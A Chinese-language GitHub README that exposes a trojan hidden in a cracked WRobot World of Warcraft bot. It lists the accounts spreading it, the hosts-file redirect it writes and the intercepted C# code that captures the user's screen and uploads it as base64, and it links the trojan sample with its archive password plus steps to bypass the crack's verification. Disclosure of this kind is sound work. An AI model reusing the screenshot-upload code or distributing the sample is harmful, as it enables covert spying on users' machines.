# Wrobot 木马

前不久获得一份WRobot的破解版程序，该程序用于魔兽世界脚本Bot。在测试环境中发现一些不寻常的地方，多次与破解程序发布者联系无果后我将所掌握的内容发布在此。

通过搜索引擎发现此破解程序的作者多年来在很多与魔兽世界相关的 中/英 论坛上发布过此破解程序的推广信息。

`木马传播涉事QQ号 8171974 287228864 401979123  QQ群 6456089 传播时间 2017-2023 活跃至今`

<details>
<summary><code><strong>「点击查看」</strong></code></summary>
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/1.PNG?raw=true" width=30%  />
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/3.PNG?raw=true" width=30%  />
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/5.PNG?raw=true" width=30%  />
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/6.PNG?raw=true" width=30%  />
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/7.PNG?raw=true" width=30%  />
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/9.PNG?raw=true" width=30%  />
</details>

<details>
<summary><code><strong>「点击查看下载地址」</strong></code></summary>

破解版WRobot验证端  解压密码：1234567890 注意此文件为木马
**[Download](https://github.com/elseif2023/Wrobot/blob/main/document/%E7%A0%B4%E8%A7%A3%E7%89%88WRobot%E9%AA%8C%E8%AF%81%E7%AB%AF.rar)**

查毒检测报告：https://www.virustotal.com/gui/file/7f5703e57194fded6e5588ad54be0b5896009e51c41c6eeaca738a8f77bcb2e7

</details>

当使用者使用 破解版WRobot验证端.exe 时会触发下列动作

1. 获取使用者的QQ和QQ群，如果未启动QQ会提示具有误导性的错误提示。当使用者关闭 破解版WRobot验证端.exe 然后登录QQ并再次启动 破解版WRobot验证端.exe 点击登录会获取使用者的QQ和QQ群，如果使用者在该程序发布者的QQ群内那么登录成功。否则则提示之前的误导性错误提示。

2. 改并添加下列内容到计算机上的hosts文件内，将使用者解析目标网站上
```
#==== 下面两行是破解版WR转向服务器IP ====
43.252.229.37 tumadre.000webhostapp.com
127.0.0.1 download.wrobot.eu
```

通过访问 43.252.229.37 发现此IP地址属于破解程序发布者的广告网站，同时注册了名为 wrobot_free.kissdjmax.com 的域名 

<details>
<summary><code><strong>「点击查看网站截图」</strong></code></summary>
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/4.PNG?raw=true" width=100%  />
</details>

成功登录到 破解版WRobot验证端 后，启动魔兽世界并进入游戏在启动由破解程序发布者提供的 WRobotWOTLK/WRobot.exe 进行激活 在使用过程中通过截取数据获得了下列内容

<details>
<summary><code><strong>「点击查看截取信息」</strong></code></summary>
  
```C#
public class Main {
  public void Initialize() {
    try {
      var exeString = System.IO.File.ReadAllText(System.Windows.Forms.Application.StartupPath + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe ");
     robotManager.Helpful.Var.SetVar("IsSafeToUse", true);
     robotManager.Helpful.Var.SetVar("SessionKey", "231983688180");
    }
    catch (System.Exception es) {}

string fullScreenShotPath = System.IO.Path.GetTempPath() + System.Environment.MachineName;

System.Drawing.Bitmap screenshot = new System.Drawing.Bitmap(System.Windows.Forms.SystemInformation.VirtualScreen.Width,
 System.Windows.Forms.SystemInformation.VirtualScreen.Height,
 System.Drawing.Imaging.PixelFormat.Format32bppArgb);
System.Drawing.Graphics screenGraph = System.Drawing.Graphics.FromImage(screenshot);
screenGraph.CopyFromScreen(System.Windows.Forms.SystemInformation.VirtualScreen.X,
 System.Windows.Forms.SystemInformation.VirtualScreen.Y,
 0,
 0,
 System.Windows.Forms.SystemInformation.VirtualScreen.Size,
 System.Drawing.CopyPixelOperation.SourceCopy);

screenshot.Save(fullScreenShotPath + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

System.Drawing.Image myImage = GetImage(fullScreenShotPath + ".jpg");

string base64Image = ImageToBase64(myImage, System.Drawing.Imaging.ImageFormat.Jpeg);
string fileName = System.Environment.MachineName;

using(System.Net.WebClient client = new System.Net.WebClient()) {
 byte[] response = client.UploadValues("http://127.0.0.1/upload/validate.php", new System.Collections.Specialized.NameValueCollection() {
  {
   "myImageData",
   base64Image
  }, {
   "fileName",
   fileName
  }
 });
}

if (System.IO.File.Exists(@fullScreenShotPath + ".jpg"))
                {
                    System.IO.File.Delete(@fullScreenShotPath + ".jpg");
                }
    }

        System.Drawing.Image GetImage(string filePath) {
         System.Net.WebClient l_WebClient = new System.Net.WebClient();
         byte[] l_imageBytes = l_WebClient.DownloadData(filePath);
         System.IO.MemoryStream l_stream = new System.IO.MemoryStream(l_imageBytes);
         return System.Drawing.Image.FromStream(l_stream);
        }

        string ImageToBase64(System.Drawing.Image image, System.Drawing.Imaging.ImageFormat format) {
         using(System.IO.MemoryStream ms = new System.IO.MemoryStream()) {
          // Convert Image to byte[]
          image.Save(ms, format);
          byte[] imageBytes = ms.ToArray();

          // Convert byte[] to Base64 String
          string base64String = System.Convert.ToBase64String(imageBytes);
          return base64String;
         }

        }
}
```
</details>

### 修改

修改截取的内容后获得下面的代码，并将解析地址由 43.252.229.37 tumadre.000webhostapp.com 改为 127.0.0.1 tumadre.000webhostapp.com 在本地部署代码后 WRobot.exe 程序激活成功，并且功能正常。

<details>
<summary><code><strong>「点击查看修改后的代码」</strong></code></summary>

```C#
public class Main {
  public void Initialize() {
    try {
      var exeString = System.IO.File.ReadAllText(System.Windows.Forms.Application.StartupPath + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe ");
     robotManager.Helpful.Var.SetVar("IsSafeToUse", true);
     robotManager.Helpful.Var.SetVar("SessionKey", "231983688180");
    }
    catch (System.Exception es) {}
    }
}
```
</details>

### 分析
检查过后发现 WRobotWOTLK\Bin\*.dll 应该被破解程序发布者做过手脚，在不本地部署代码只删除掉 *.dll 内几处代码后正常启动。

此破解程序是用于魔兽世界私人服务器，此类游登陆器大多会被杀毒软件提示病毒而让玩家关闭杀毒，破解程序通过设置多个障碍来在一个小范围内寻找合适的目标并以此获利。

应该是出于获利的目的 43.252.229.37 这个用于验证的IP并不是时刻都能使用(根本不需要，即便需要也不存在所谓流量过大)，从而诱导使用者付费。一旦 43.252.229.37 此验证IP无法验证，那么也无法截取到任何有效内容。

```
域名: wrobot_free.kissdjmax.com	 IP: 43.252.229.37  托管: Cloudie Limited
域名: wrobot_vip.kissdjmax.com	 IP: 103.96.74.226  托管: Cloudie Limited
```

此软件涉及屏幕截图和通过Web请求发送图像数据，这绝不是正常软件会做的事。

### 结论
在火绒安全提交了样本后，由火绒安全人工认定此破解程序为木马，处理结果 `https://bbs.huorong.cn/forum.php?mod=viewthread&tid=122996`

```
病毒名称：Trojan/Agent.bbp
病毒ID：6D2ACBF71A377760
病毒路径：C:\Users\game\AppData\Local\Temp\Rar$DRb2668.5172\破解版WRobot验证端.exe
操作类型：修改 
操作结果：已处理
```
https://user-images.githubusercontent.com/127265295/225115946-6562ab47-a3ad-4b4f-a5bd-0c086a57b625.mp4

### 设置本地验证与去掉验证直接使用
为避免更多人受害，通过2种方法可以不需要通过外部联网验证使用此软件。注意：下方网盘中全部文件来源于 QQ群 6456089 我不保证群管理员是否还添加了其他隐藏的木马，如果你想要使用请确保在虚拟机内运行。此网盘文件中包含2种验证方法的高清视频，过程很简单。

#### 「方法1」

https://user-images.githubusercontent.com/127265295/227767617-3db09c4e-4010-4a35-85e1-8ff17a42f501.mp4


#### 「方法2」

https://user-images.githubusercontent.com/127265295/227767634-607cfbc0-1a06-4508-8d1d-17fda18d6ae6.mp4

```
已知木马已删除,但不排除还有。下面是全文件下载地址

移动网盘 https://caiyun.139.com/m/i?075CuXuSUI4MY  提取码:eyPa
百度网盘 https://pan.baidu.com/s/18piFxYvKNR2M4T0NvNqJbw?pwd=zvbs 提取码：zvbs

谷歌网盘 https://drive.google.com/drive/folders/1--JXH7XOqQuKQRFP9jTQStCuIprzlP6Z?usp=drive_link
PikPak  https://mypikpak.com/s/VN_OAadRObxz_H4E6MSfZHCCo1 密码: u36a

```
<details>
<summary><code><strong>「查看截图」</strong></code></summary>
<img src="https://github.com/elseif2023/Wrobot/blob/main/picture/Screenshot_2023-03-14_13-02-20.png?raw=true" width=30%  />
</details>

### 所有文件都在此存储库内可自行下载检查,注意此存储库的有不安全的文件,请在虚拟机内查看.带密码的压缩包内的文件已认定为木马
